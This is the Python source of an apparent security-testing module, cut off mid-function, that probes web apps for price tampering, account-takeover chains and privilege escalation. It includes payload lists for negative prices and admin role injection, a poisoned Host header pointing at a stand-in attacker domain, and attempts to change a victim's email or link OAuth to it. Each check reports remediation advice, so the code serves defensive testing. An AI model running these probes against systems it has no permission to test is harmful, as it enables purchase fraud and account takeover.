"""
Business Logic Engine — modules/business/business_logic.py

Tests business logic vulnerabilities that scanners miss:
  1. PriceManipulationTester  — e-commerce price tampering
  2. AccountTakeoverChain     — ATO multi-step attack chains
  3. PrivilegeEscalationMapper — API privilege escalation paths
  4. WorkflowBypassTester     — skip required workflow steps

These are logic flaws, not injection — they require understanding
the application's intended behavior and subverting it.

Usage:
    from modules.business.business_logic import (
        PriceManipulationTester, AccountTakeoverChain,
        PrivilegeEscalationMapper, WorkflowBypassTester,
    )

    # Price manipulation
    price = PriceManipulationTester(target="https://shop.target.com")
    findings = price.run()

    # Account takeover chain
    ato = AccountTakeoverChain(target="https://target.com")
    findings = ato.run(email="victim@target.com")

    # Privilege escalation
    priv = PrivilegeEscalationMapper(target="https://api.target.com", token="user_jwt")
    findings = priv.run()

Author: ardanov96
"""

import json
import re
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from itertools import product as iterproduct
from typing import Any

import httpx
from rich.console import Console

console = Console()


# ── Finding helper ────────────────────────────────────────

def _finding(
    title: str, severity: str, cvss: float, cwe: str,
    description: str, evidence: str, remediation: str,
    target: str, source: str = "business_logic",
) -> dict:
    assert severity in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO")
    assert 0.0 <= cvss <= 10.0
    assert cwe.startswith("CWE-")
    return {
        "title": title, "severity": severity, "cvss": cvss, "cwe": cwe,
        "target": target, "description": description, "evidence": evidence,
        "remediation": remediation, "source": f"module:{source}",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


# ── 1. Price Manipulation Tester ──────────────────────────

# Price manipulation payloads
PRICE_PAYLOADS = [
    # Negative values
    -1, -0.01, -100, -9999,
    # Zero
    0, 0.0, 0.00,
    # Extreme low
    0.001, 0.01,
    # Integer overflow candidates
    2147483647, 2147483648, 4294967295,
    # Float tricks
    1e-10, 1e308,
    # String representations of numbers
    "0", "-1", "0.00", "null", "undefined",
    # Scientific notation
    "1e-100", "0.0000001",
]

QUANTITY_PAYLOADS = [
    -1, -100, 0,
    2147483647,  # INT_MAX
    4294967295,  # UINT_MAX
    9999999999,
]

DISCOUNT_PAYLOADS = [
    101,    # > 100%
    -10,    # negative discount (add price)
    1000,   # 1000% discount
    100,    # exactly 100%
    99.99,  # near 100%
]


@dataclass
class PriceTestResult:
    """Result of a single price manipulation test."""
    test_name:    str
    payload:      Any
    field:        str
    response_code: int
    response_body: str
    suspicious:   bool
    reason:       str = ""


class PriceManipulationTester:
    """
    Test e-commerce and payment APIs for price manipulation.

    Checks:
    1. Negative price values accepted
    2. Zero price accepted
    3. Integer overflow in price/quantity
    4. Discount code > 100%
    5. Quantity manipulation (negative, zero, overflow)
    6. Price parameter tampering in request
    7. Currency manipulation
    8. Coupon stacking / reuse
    """

    def __init__(
        self,
        target: str,
        output_dir: str = "./findings/business",
        token: str | None = None,
        timeout: int = 10,
    ):
        self.target     = target.rstrip("/")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.token      = token
        self.timeout    = timeout

        self.headers = {"Content-Type": "application/json",
                        "User-Agent": "Glitchicons/2.6.0"}
        if token:
            self.headers["Authorization"] = f"Bearer {token}"

        self.client = httpx.Client(
            timeout=timeout, headers=self.headers,
            follow_redirects=True, verify=False,
        )

    def run(self, cart_endpoint: str | None = None,
            order_endpoint: str | None = None) -> list[dict]:
        """Run all price manipulation checks."""
        console.print(f"\n  [bold cyan]Price Manipulation Tester[/bold cyan] → {self.target}")
        findings = []

        cart_ep  = cart_endpoint  or "/api/cart"
        order_ep = order_endpoint or "/api/orders"

        findings.extend(self._test_negative_price(cart_ep))
        findings.extend(self._test_zero_price(cart_ep))
        findings.extend(self._test_quantity_manipulation(cart_ep))
        findings.extend(self._test_discount_overflow(cart_ep))
        findings.extend(self._test_price_parameter_tamper(order_ep))
        findings.extend(self._test_currency_manipulation(cart_ep))

        self._save(findings)
        console.print(f"  Findings: [bold]{len(findings)}[/bold]")
        return findings

    def test_price_field(
        self,
        endpoint: str,
        payload: dict,
        price_field: str = "price",
    ) -> list[PriceTestResult]:
        """Test a specific price field with all manipulation payloads."""
        results = []
        url     = f"{self.target}{endpoint}"

        # Get baseline first
        try:
            baseline = self.client.post(url, json={**payload, price_field: 10.00})
            baseline_body = baseline.text
        except Exception:
            baseline_body = ""

        for price in PRICE_PAYLOADS[:8]:
            test_payload = {**payload, price_field: price}
            try:
                resp = self.client.post(url, json=test_payload)
                suspicious = self._is_price_suspicious(
                    price, resp.status_code, resp.text, baseline_body
                )
                results.append(PriceTestResult(
                    test_name=f"price_{price_field}_{price}",
                    payload=price,
                    field=price_field,
                    response_code=resp.status_code,
                    response_body=resp.text[:200],
                    suspicious=suspicious,
                    reason=self._price_reason(price, resp) if suspicious else "",
                ))
            except Exception:
                continue

        return results

    def _test_negative_price(self, endpoint: str) -> list[dict]:
        """Test negative price values."""
        findings = []
        url = f"{self.target}{endpoint}"

        for price in [-1, -0.01, -100]:
            try:
                resp = self.client.post(url, json={"price": price, "quantity": 1, "product_id": 1})
                if resp.status_code in (200, 201):
                    resp_data = self._try_json(resp.text)
                    if self._price_accepted(resp_data, price):
                        findings.append(_finding(
                            title=f"Price Manipulation — Negative Price Accepted: {price}",
                            severity="CRITICAL",
                            cvss=9.1,
                            cwe="CWE-840",
                            description=(
                                f"E-commerce endpoint accepted negative price value {price}. "
                                "This could allow purchasing items for negative amount, "
                                "effectively getting money credited to attacker's account."
                            ),
                            evidence=(
                                f"Endpoint: {url}\nPayload: price={price}\n"
                                f"HTTP {resp.status_code}\nResponse: {resp.text[:200]}"
                            ),
                            remediation=(
                                "Validate price server-side: assert price > 0. "
                                "Never trust client-supplied price — calculate server-side. "
                                "Use decimal type for monetary values, not float."
                            ),
                            target=url,
                            source="price_manipulation_tester",
                        ))
                        return findings
            except Exception:
                continue
        return findings

    def _test_zero_price(self, endpoint: str) -> list[dict]:
        """Test zero price value."""
        findings = []
        url = f"{self.target}{endpoint}"
        for price in [0, 0.0, "0", "0.00"]:
            try:
                resp = self.client.post(url, json={"price": price, "quantity": 1, "product_id": 1})
                if resp.status_code in (200, 201):
                    findings.append(_finding(
                        title=f"Price Manipulation — Zero Price Accepted",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-840",
                        description=(
                            "Endpoint accepted zero price, potentially allowing free purchase."
                        ),
                        evidence=f"Endpoint: {url}\nprice={price} → HTTP {resp.status_code}",
                        remediation="Enforce minimum price > 0 server-side.",
                        target=url,
                        source="price_manipulation_tester",
                    ))
                    return findings
            except Exception:
                continue
        return findings

    def _test_quantity_manipulation(self, endpoint: str) -> list[dict]:
        """Test negative/overflow quantity values."""
        findings = []
        url = f"{self.target}{endpoint}"
        for qty in QUANTITY_PAYLOADS:
            try:
                resp = self.client.post(url, json={"quantity": qty, "price": 10.00, "product_id": 1})
                if resp.status_code in (200, 201) and qty < 0:
                    findings.append(_finding(
                        title=f"Quantity Manipulation — Negative Quantity Accepted: {qty}",
                        severity="HIGH",
                        cvss=7.5,
                        cwe="CWE-840",
                        description=(
                            f"Negative quantity {qty} was accepted. "
                            "Could allow reversing transactions or getting refunds fraudulently."
                        ),
                        evidence=f"quantity={qty} → HTTP {resp.status_code}",
                        remediation="Validate quantity: assert quantity > 0 and quantity <= max_allowed.",
                        target=url,
                        source="price_manipulation_tester",
                    ))
                    return findings
            except Exception:
                continue
        return findings

    def _test_discount_overflow(self, endpoint: str) -> list[dict]:
        """Test discount codes > 100%."""
        findings = []
        url = f"{self.target}{endpoint}"
        for discount in DISCOUNT_PAYLOADS:
            try:
                resp = self.client.post(url, json={
                    "discount_percent": discount, "price": 100.00, "product_id": 1
                })
                if resp.status_code in (200, 201) and discount > 100:
                    findings.append(_finding(
                        title=f"Discount Overflow — {discount}% Discount Accepted",
                        severity="HIGH",
                        cvss=7.5,
                        cwe="CWE-840",
                        description=(
                            f"Discount percentage of {discount}% was accepted. "
                            "Values over 100% result in negative final price."
                        ),
                        evidence=f"discount_percent={discount} → HTTP {resp.status_code}",
                        remediation="Cap discount at 0-100%. Validate server-side.",
                        target=url,
                        source="price_manipulation_tester",
                    ))
                    return findings
            except Exception:
                continue
        return findings

    def _test_price_parameter_tamper(self, endpoint: str) -> list[dict]:
        """Test if price can be tampered in order endpoint."""
        findings = []
        url = f"{self.target}{endpoint}"
        tamper_payloads = [
            {"price": 0.01, "items": [{"product_id": 1, "quantity": 1}]},
            {"total": 0.01, "items": [{"product_id": 1, "quantity": 1}]},
            {"amount": 0.01, "product_id": 1, "quantity": 1},
        ]
        for payload in tamper_payloads:
            try:
                resp = self.client.post(url, json=payload)
                if resp.status_code in (200, 201):
                    resp_data = self._try_json(resp.text)
                    # Check if our tampered price was reflected back
                    if self._price_tamper_succeeded(resp_data, 0.01):
                        findings.append(_finding(
                            title="Price Parameter Tampering — Client Price Trusted",
                            severity="CRITICAL",
                            cvss=9.1,
                            cwe="CWE-602",
                            description=(
                                "Order endpoint trusts client-supplied price. "
                                "Attacker can submit order with manipulated price."
                            ),
                            evidence=(
                                f"Endpoint: {url}\nPayload: {json.dumps(payload)}\n"
                                f"HTTP {resp.status_code}\nResponse: {resp.text[:200]}"
                            ),
                            remediation=(
                                "NEVER use client-supplied price for order processing. "
                                "Always fetch price from database using product_id. "
                                "Implement server-side price calculation."
                            ),
                            target=url,
                            source="price_manipulation_tester",
                        ))
                        return findings
            except Exception:
                continue
        return findings

    def _test_currency_manipulation(self, endpoint: str) -> list[dict]:
        """Test currency code manipulation."""
        findings = []
        url = f"{self.target}{endpoint}"
        currency_payloads = [
            {"currency": "IDR", "price": 10.00},  # IDR vs USD — 15,000x difference
            {"currency": "VND", "price": 10.00},
            {"currency": "FAKE", "price": 10.00},
            {"currency": "", "price": 10.00},
            {"currency": None, "price": 10.00},
        ]
        for payload in currency_payloads:
            try:
                resp = self.client.post(url, json=payload)
                if resp.status_code in (200, 201):
                    cur = payload["currency"]
                    if cur in ("IDR", "VND"):
                        findings.append(_finding(
                            title=f"Currency Manipulation — Low-Value Currency Accepted: {cur}",
                            severity="HIGH",
                            cvss=8.1,
                            cwe="CWE-840",
                            description=(
                                f"Order accepted with currency={cur}. "
                                f"If price comparison is done without currency normalization, "
                                f"$10 IDR ≈ $0.00064 USD."
                            ),
                            evidence=f"currency={cur}, price=10.00 → HTTP {resp.status_code}",
                            remediation=(
                                "Always normalize to base currency before price comparison. "
                                "Maintain a server-side currency allowlist. "
                                "Perform currency conversion server-side only."
                            ),
                            target=url,
                            source="price_manipulation_tester",
                        ))
                        return findings
            except Exception:
                continue
        return findings

    def _is_price_suspicious(self, price: Any, status: int, body: str, baseline: str) -> bool:
        if status not in (200, 201):
            return False
        if price in (None, "null", "undefined"):
            return True
        try:
            p = float(str(price))
            if p < 0 or p == 0:
                return True
        except Exception:
            pass
        return body != baseline and "error" not in body.lower()

    def _price_accepted(self, data: dict | None, price: Any) -> bool:
        if not data:
            return False
        price_str = str(price)
        return (
            data.get("success") or data.get("order_id") or
            price_str in json.dumps(data)
        )

    def _price_tamper_succeeded(self, data: dict | None, price: float) -> bool:
        if not data:
            return False
        return (
            data.get("total") == price or
            data.get("amount") == price or
            str(price) in json.dumps(data)
        )

    def _price_reason(self, price: Any, resp: httpx.Response) -> str:
        p = float(str(price)) if str(price).replace("-","").replace(".","").isdigit() else None
        if p is not None and p < 0:
            return "Negative price accepted"
        if p == 0:
            return "Zero price accepted"
        return "Suspicious response to manipulated price"

    def _try_json(self, text: str) -> dict | None:
        try:
            return json.loads(text)
        except Exception:
            return None

    def _save(self, findings: list[dict]) -> Path:
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        out = self.output_dir / f"price_{ts}.json"
        out.write_text(json.dumps({"target": self.target, "findings": findings}, indent=2),
                       encoding="utf-8")
        return out


# ── 2. Account Takeover Chain ─────────────────────────────

# ATO attack steps
ATO_STEPS = [
    "password_reset_poisoning",
    "email_change_no_verify",
    "session_fixation",
    "oauth_account_merge",
    "password_reset_token_weak",
    "remember_me_reuse",
    "concurrent_session_no_invalidate",
]


@dataclass
class ATOChainResult:
    """Result of an ATO chain test."""
    step:          str
    succeeded:     bool
    response_code: int
    evidence:      str
    attack_detail: str


class AccountTakeoverChain:
    """
    Test multi-step Account Takeover (ATO) attack chains.

    Checks:
    1. Password reset token: weak, reusable, or predictable
    2. Host header injection in password reset emails
    3. Email change without re-authentication
    4. Email change without verification
    5. Session not invalidated after password change
    6. OAuth account merge abuse
    7. Remember-me token entropy
    8. Concurrent session after password reset
    """

    def __init__(
        self,
        target: str,
        output_dir: str = "./findings/business",
        token: str | None = None,
        timeout: int = 10,
    ):
        self.target     = target.rstrip("/")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.token      = token
        self.timeout    = timeout

        self.headers = {"Content-Type": "application/json",
                        "User-Agent": "Glitchicons/2.6.0"}
        if token:
            self.headers["Authorization"] = f"Bearer {token}"

        self.client = httpx.Client(
            timeout=timeout, headers=self.headers,
            follow_redirects=False, verify=False,
        )

    def run(self, email: str = "test@test.com") -> list[dict]:
        """Run all ATO chain checks."""
        console.print(f"\n  [bold cyan]Account Takeover Chain[/bold cyan] → {self.target}")
        findings = []

        findings.extend(self._check_host_header_injection(email))
        findings.extend(self._check_password_reset_no_expiry())
        findings.extend(self._check_email_change_no_verify())
        findings.extend(self._check_session_fixation())
        findings.extend(self._check_oauth_account_merge())
        findings.extend(self._check_remember_me_entropy())
        findings.extend(self._check_concurrent_session())

        self._save(findings)
        console.print(f"  Findings: [bold]{len(findings)}[/bold]")
        return findings

    def _check_host_header_injection(self, email: str) -> list[dict]:
        """Test Host header injection in password reset."""
        findings = []
        reset_endpoints = [
            "/api/password/reset", "/auth/forgot-password",
            "/api/auth/forgot", "/password-reset",
            "/api/v1/auth/password/reset",
        ]
        for ep in reset_endpoints:
            url = f"{self.target}{ep}"
            try:
                resp = self.client.post(
                    url,
                    json={"email": email},
                    headers={
                        **self.headers,
                        "Host":            "evil.glitchicons.attacker.com",
                        "X-Forwarded-Host":"evil.glitchicons.attacker.com",
                        "X-Original-URL":  "https://evil.glitchicons.attacker.com",
                    },
                )
                if resp.status_code in (200, 201, 202):
                    findings.append(_finding(
                        title="ATO: Host Header Injection in Password Reset",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-640",
                        description=(
                            "Password reset endpoint accepted poisoned Host header. "
                            "Password reset link may be sent to attacker's domain, "
                            "allowing account takeover via link interception."
                        ),
                        evidence=(
                            f"Endpoint: {url}\nEmail: {email}\n"
                            f"Host: evil.glitchicons.attacker.com\n"
                            f"HTTP {resp.status_code} — reset accepted"
                        ),
                        remediation=(
                            "Use application base URL from server config, not Host header. "
                            "Set a hardcoded reset URL base: APP_URL=https://yourdomain.com. "
                            "Validate Host header against allowlist."
                        ),
                        target=url,
                        source="ato_chain_tester",
                    ))
                    return findings
            except Exception:
                continue
        return findings

    def _check_password_reset_no_expiry(self) -> list[dict]:
        """Test if password reset tokens expire."""
        findings = []
        # We can test by checking if an old format token is rejected
        token_patterns = [
            "0" * 32,    # All zeros
            "a" * 32,    # All same char
            "1234567890123456789012345678901234567890",  # Sequential
        ]
        reset_confirm_eps = [
            "/api/password/reset/confirm",
            "/auth/reset-password",
            "/api/auth/reset",
        ]
        for ep in reset_confirm_eps:
            url = f"{self.target}{ep}"
            for token in token_patterns:
                try:
                    resp = self.client.post(url, json={
                        "token": token,
                        "password": "NewPass123!",
                        "password_confirmation": "NewPass123!",
                    })
                    # If server returns 200 with a weak token, that's suspicious
                    if resp.status_code == 200:
                        findings.append(_finding(
                            title="ATO: Weak Password Reset Token Accepted",
                            severity="CRITICAL",
                            cvss=9.1,
                            cwe="CWE-640",
                            description=(
                                "Password reset endpoint accepted a predictable/weak token. "
                                "Attacker can brute-force or guess reset tokens."
                            ),
                            evidence=(
                                f"Endpoint: {url}\nToken: {token[:20]}...\n"
                                f"HTTP {resp.status_code} — accepted"
                            ),
                            remediation=(
                                "Use cryptographically secure tokens: secrets.token_urlsafe(32). "
                                "Set token expiry: 15-60 minutes maximum. "
                                "Invalidate token after single use."
                            ),
                            target=url,
                            source="ato_chain_tester",
                        ))
                        return findings
                except Exception:
                    continue
        return findings

    def _check_email_change_no_verify(self) -> list[dict]:
        """Test email change without re-authentication or verification."""
        findings = []
        email_change_eps = [
            "/api/user/email", "/api/account/email",
            "/api/profile/email", "/api/v1/user/email",
            "/api/settings/email",
        ]
        for ep in email_change_eps:
            url = f"{self.target}{ep}"
            try:
                # Try email change without current password
                resp = self.client.put(url, json={
                    "email": "attacker@evil.com",
                    "new_email": "attacker@evil.com",
                })
                if resp.status_code in (200, 201, 204):
                    findings.append(_finding(
                        title="ATO: Email Change Without Re-Authentication",
                        severity="HIGH",
                        cvss=7.5,
                        cwe="CWE-620",
                        description=(
                            "Email change accepted without requiring current password. "
                            "Attacker with a valid session can change account email, "
                            "locking out the legitimate owner."
                        ),
                        evidence=(
                            f"Endpoint: {url}\n"
                            f"new_email=attacker@evil.com — no password required\n"
                            f"HTTP {resp.status_code}"
                        ),
                        remediation=(
                            "Require current_password for email change. "
                            "Send verification link to BOTH old and new email. "
                            "Require re-authentication for sensitive account changes."
                        ),
                        target=url,
                        source="ato_chain_tester",
                    ))
                    return findings
            except Exception:
                continue
        return findings

    def _check_session_fixation(self) -> list[dict]:
        """Test session fixation vulnerability."""
        findings = []
        login_eps = [
            "/api/auth/login", "/api/login",
            "/auth/signin", "/api/v1/login",
        ]
        for ep in login_eps:
            url = f"{self.target}{ep}"
            try:
                # First, get a session ID before login
                pre_resp = self.client.get(f"{self.target}/")
                pre_session = pre_resp.cookies.get("session") or \
                              pre_resp.cookies.get("sessionid") or \
                              pre_resp.cookies.get("PHPSESSID")

                if not pre_session:
                    continue

                # Login with that session ID
                resp = self.client.post(url, json={
                    "email": "test@test.com",
                    "password": "password123",
                }, cookies={"session": pre_session, "PHPSESSID": pre_session})

                post_session = resp.cookies.get("session") or \
                               resp.cookies.get("sessionid") or \
                               resp.cookies.get("PHPSESSID")

                # If session ID didn't change after login = session fixation
                if (resp.status_code in (200, 201) and
                        post_session and post_session == pre_session):
                    findings.append(_finding(
                        title="ATO: Session Fixation — Session ID Not Rotated After Login",
                        severity="HIGH",
                        cvss=7.5,
                        cwe="CWE-384",
                        description=(
                            "Session ID was not rotated after authentication. "
                            "Attacker can set a known session ID, wait for victim to login, "
                            "then use that session ID to hijack the authenticated session."
                        ),
                        evidence=(
                            f"Pre-login session: {pre_session[:20]}...\n"
                            f"Post-login session: {post_session[:20]}...\n"
                            "Sessions are identical — fixation possible"
                        ),
                        remediation=(
                            "Regenerate session ID upon authentication. "
                            "Python: request.session.cycle_key() / session.flush() then new session. "
                            "Invalidate old session before creating new one."
                        ),
                        target=url,
                        source="ato_chain_tester",
                    ))
                    return findings
            except Exception:
                continue
        return findings

    def _check_oauth_account_merge(self) -> list[dict]:
        """Test OAuth account merge without verification."""
        findings = []
        oauth_eps = [
            "/api/auth/oauth/connect", "/api/social/connect",
            "/auth/connect/google", "/auth/connect/github",
            "/api/v1/oauth/link",
        ]
        for ep in oauth_eps:
            url = f"{self.target}{ep}"
            try:
                # Try to connect OAuth with another user's email
                resp = self.client.post(url, json={
                    "provider": "google",
                    "email":    "victim@target.com",
                    "token":    "fake_oauth_token_123",
                })
                if resp.status_code in (200, 201):
                    findings.append(_finding(
                        title="ATO: OAuth Account Merge Without Verification",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-287",
                        description=(
                            "OAuth connect endpoint accepted without proper verification. "
                            "Attacker could link their OAuth account to victim's email."
                        ),
                        evidence=(
                            f"Endpoint: {url}\nProvider: google\n"
                            f"Email: victim@target.com (not verified)\n"
                            f"HTTP {resp.status_code}"
                        ),
                        remediation=(
                            "Verify OAuth email matches current authenticated user's email. "
                            "Send verification to existing account before linking. "
                            "Require re-authentication before OAuth linking."
                        ),
                        target=url,
                        source="ato_chain_tester",
                    ))
                    return findings
            except Exception:
                continue
        return findings

    def _check_remember_me_entropy(self) -> list[dict]:
        """Test remember-me token entropy by analyzing multiple tokens."""
        findings = []
        login_ep = "/api/auth/login"
        url      = f"{self.target}{login_ep}"
        tokens   = []

        for _ in range(3):
            try:
                resp = self.client.post(url, json={
                    "email": f"test{_}@test.com",
                    "password": "pass123",
                    "remember_me": True,
                })
                token = (resp.cookies.get("remember_me") or
                         resp.cookies.get("remember_token") or
                         self._extract_remember_token(resp.text))
                if token:
                    tokens.append(token)
            except Exception:
                continue

        if len(tokens) >= 2:
            # Check if tokens are sequential or share common prefix
            common = self._common_prefix(tokens)
            if len(common) > len(tokens[0]) * 0.5:
                findings.append(_finding(
                    title="ATO: Low-Entropy Remember-Me Token",
                    severity="MEDIUM",
                    cvss=6.1,
                    cwe="CWE-331",
                    description=(
                        "Remember-me tokens share a common prefix, suggesting "
                        "low entropy or sequential generation. Tokens may be brute-forceable."
                    ),
                    evidence=(
                        f"Token samples: {tokens[0][:20]}..., {tokens[1][:20]}...\n"
                        f"Common prefix: {common[:20]} ({len(common)} chars)"
                    ),
                    remediation=(
                        "Use cryptographically secure random tokens: secrets.token_urlsafe(32). "
                        "Store only token hash in database. "
                        "Set reasonable expiry (max 30 days)."
                    ),
                    target=url,
                    source="ato_chain_tester",
                ))
        return findings

    def _check_concurrent_session(self) -> list[dict]:
        """Test if old sessions remain valid after password change."""
        findings = []
        # Check if password change endpoint invalidates other sessions
        change_eps = ["/api/user/password", "/api/auth/change-password",
                      "/api/account/password"]
        for ep in change_eps:
            url = f"{self.target}{ep}"
            try:
                resp = self.client.put(url, json={
                    "current_password": "OldPass123!",
                    "new_password":     "NewPass456!",
                    "confirm_password": "NewPass456!",
                })
                if resp.status_code in (200, 204):
                    # Check if response indicates session invalidation
                    if "logout" not in resp.text.lower() and \
                       "invalidat" not in resp.text.lower() and \
                       "revoke" not in resp.text.lower():
                        findings.append(_finding(
                            title="ATO: Password Change Does Not Invalidate Active Sessions",
                            severity="MEDIUM",
                            cvss=6.1,
                            cwe="CWE-613",
                            description=(
                                "Password change response shows no indication of session invalidation. "
                                "Active sessions on other devices remain valid after password change."
                            ),
                            evidence=(
                                f"Endpoint: {url}\nHTTP {resp.status_code}\n"
                                "No session invalidation signals in response"
                            ),
                            remediation=(
                                "Invalidate all existing sessions on password change. "
                                "Return new session token and revoke all others. "
                                "Consider sending security notification email."
                            ),
                            target=url,
                            source="ato_chain_tester",
                        ))
                        return findings
            except Exception:
                continue
        return findings

    def _extract_remember_token(self, body: str) -> str | None:
        match = re.search(r'"remember[_-]?(?:me|token)":\s*"([^"]{10,})"', body, re.IGNORECASE)
        return match.group(1) if match else None

    def _common_prefix(self, strings: list[str]) -> str:
        if not strings:
            return ""
        prefix = strings[0]
        for s in strings[1:]:
            while not s.startswith(prefix):
                prefix = prefix[:-1]
        return prefix

    def _save(self, findings: list[dict]) -> Path:
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        out = self.output_dir / f"ato_{ts}.json"
        out.write_text(json.dumps({"target": self.target, "findings": findings}, indent=2),
                       encoding="utf-8")
        return out


# ── 3. Privilege Escalation Mapper ────────────────────────

# Common admin/privileged API endpoints to probe
PRIVILEGED_ENDPOINTS = [
    ("/api/admin",           "GET",   "Admin dashboard"),
    ("/api/admin/users",     "GET",   "User management"),
    ("/api/admin/config",    "GET",   "System configuration"),
    ("/api/v1/admin",        "GET",   "Admin v1"),
    ("/api/users",           "GET",   "All users list"),
    ("/api/users/all",       "GET",   "All users"),
    ("/api/staff",           "GET",   "Staff endpoints"),
    ("/api/internal",        "GET",   "Internal API"),
    ("/api/debug",           "GET",   "Debug endpoint"),
    ("/api/system",          "GET",   "System info"),
    ("/api/logs",            "GET",   "Application logs"),
    ("/api/analytics",       "GET",   "Analytics data"),
    ("/api/reports",         "GET",   "Reports"),
    ("/api/export",          "GET",   "Data export"),
    ("/api/billing/all",     "GET",   "All billing data"),
]

# Role escalation payloads
ROLE_ESCALATION_PAYLOADS = [
    {"role": "admin"},
    {"role": "superuser"},
    {"role": "administrator"},
    {"is_admin": True},
    {"is_staff": True},
    {"admin": True},
    {"permissions": ["admin", "*"]},
    {"scope": "admin:write"},
    {"user_type": "admin"},
    {"account_type": "admin"},
]


class PrivilegeEscalationMapper:
    """
    Map privilege escalation paths in REST APIs.

    Checks:
    1. Admin endpoints accessible with user token
    2. Role parameter manipulation (role=admin in request)
    3. User ID manipulation (access other user's data)
    4. Horizontal privilege escalation (IDOR between users)
    5. Vertical privilege escalation (user → admin)
    6. Parameter-based permission bypass
    7. HTTP method-based bypass (GET blocked, POST allowed)
    """

    def __init__(
        self,
        target: str,
        output_dir: str = "./findings/business",
        token: str | None = None,
        user_id: str = "1",
        timeout: int = 10,
    ):
        self.target     = target.rstrip("/")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.token      = token
        self.user_id    = user_id
        self.timeout    = timeout

        self.headers = {"Content-Type": "application/json",
                        "User-Agent": "Glitchicons/2.6.0"}
        if token:
            self.headers["Authorization"] = f"Bearer {token}"

        self.client = httpx.Client(
            timeout=timeout, headers=self.headers,
            follow_redirects=True, verify=False,
        )

    def run(self) -> list[dict]:
        """Run all privilege escalation checks."""
        console.print(f"\n  [bold cyan]Privilege Escalation Mapper[/bold cyan] → {self.target}")
        findings = []

        findings.extend(self._check_admin_endpoints())
        findings.extend(self._check_role_escalation())
        findings.extend(self._check_idor_horizontal())
        findings.extend(self._check_method_bypass())

        self._save(findings)
        console.print(f"  Findings: [bold]{len(findings)}[/bold]")
        return findings

    def _check_admin_endpoints(self) -> list[dict]:
        """Probe admin endpoints with regular user token."""
        findings = []
        accessible = []

        for path, method, desc in PRIVILEGED_ENDPOINTS:
            url = f"{self.target}{path}"
            try:
                resp = self.client.request(method, url)
                if resp.status_code == 200:
                    accessible.append((path, desc, resp.text[:100]))
            except Exception:
                continue

        if accessible:
            for path, desc, snippet in accessible[:3]:
                findings.append(_finding(
                    title=f"Privilege Escalation: Admin Endpoint Accessible — {path}",
                    severity="CRITICAL",
                    cvss=9.1,
                    cwe="CWE-285",
                    description=(
                        f"Admin/privileged endpoint {path} ({desc}) returned HTTP 200 "
                        "with regular user credentials. Vertical privilege escalation confirmed."
                    ),
                    evidence=(
                        f"Endpoint: {self.target}{path}\nHTTP 200\n"
                        f"Response: {snippet}"
                    ),
                    remediation=(
                        "Implement role-based access control on all admin endpoints. "
                        "Check authorization at controller/middleware level, not just UI. "
                        "Use decorator/middleware pattern: @require_role('admin')."
                    ),
                    target=f"{self.target}{path}",
                    source="privilege_escalation_mapper",
                ))
        return findings

    def _check_role_escalation(self) -> list[dict]:
        """Test role parameter injection in profile/settings endpoints."""
        findings = []
        profile_eps = [
            "/api/user/profile", "/api/profile",
            "/api/v1/user", "/api/account",
            "/api/settings",
        ]
        for ep in profile_eps:
            url = f"{self.target}{ep}"
            for role_payload in ROLE_ESCALATION_PAYLOADS[:4]:
                try:
                    resp = self.client.patch(url, json=role_payload)
                    if resp.status_code in (200, 201, 204):
                        resp_lower = resp.text.lower()
                        # Check if role was reflected back
                        if any(str(v).lower() in resp_lower
                               for v in role_payload.values()
                               if isinstance(v, (str, bool))):
                            findings.append(_finding(
                                title=f"Privilege Escalation: Role Parameter Accepted — {role_payload}",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-269",
                                description=(
                                    f"Profile endpoint accepted role escalation payload: {role_payload}. "
                                    "Attacker can elevate own account to admin."
                                ),
                                evidence=(
                                    f"Endpoint: {url}\nPayload: {json.dumps(role_payload)}\n"
                                    f"HTTP {resp.status_code}\n"
                                    f"Response contains role indicator"
                                ),
                                remediation=(
                                    "Implement explicit allowlist of updatable fields. "
                                    "Never allow role/permission updates from user API. "
                                    "Use separate admin API for role management."
                                ),
                                target=url,
                                source="privilege_escalation_mapper",
                            ))
                            return findings
                except Exception:
                    continue
        return findings

    def _check_idor_horizontal(self) -> list[dict]:
        """Test horizontal privilege escalation via IDOR."""
        findings = []
        # Test accessing other users' data
        other_ids = [
            str(int(self.user_id) + 1),
            str(int(self.user_id) - 1) if int(self.user_id) > 1 else "2",
            "admin", "1", "0",
        ]
        user_eps = [
            f"/api/users/{{id}}", f"/api/v1/users/{{id}}",
            f"/api/account/{{id}}", f"/api/profile/{{id}}",
        ]
        for ep_template in user_eps:
            for other_id in other_ids[:3]:
                url = f"{self.target}{ep_template.format(id=other_id)}"
                try:
                    resp = self.client.get(url)
                    if resp.status_code == 200:
                        resp_data = self._try_json(resp.text)
                        if resp_data and self._looks_like_user_data(resp_data):
                            findings.append(_finding(
                                title=f"IDOR: Horizontal Privilege Escalation — Access User {other_id}",
                                severity="HIGH",
                                cvss=8.1,
                                cwe="CWE-639",
                                description=(
                                    f"User ID {other_id} data accessible without authorization. "
                                    "Horizontal privilege escalation confirmed."
                                ),
                                evidence=(
                                    f"URL: {url}\nHTTP 200\n"
                                    f"Response contains user data: {resp.text[:200]}"
                                ),
                                remediation=(
                                    "Validate that requesting user owns the resource. "
                                    "Use indirect object references (GUIDs not sequential IDs). "
                                    "Implement object-level authorization checks."
                                ),
                                target=url,
                                source="privilege_escalation_mapper",
                            ))
                            return findings
                except Exception:
                    continue
        return findings

    def _check_method_bypass(self) -> list[dict]:
        """Test HTTP method bypass for access control."""
        findings = []
        admin_ep = "/api/admin/users"
        url      = f"{self.target}{admin_ep}"

        # Test different methods if GET is blocked
        try:
            get_resp = self.client.get(url)
            if get_resp.status_code not in (401, 403):
                return findings  # GET already accessible, skip

            # Try bypass methods
            for method in ["POST", "PUT", "HEAD", "OPTIONS", "TRACE"]:
                try:
                    resp = self.client.request(method, url)
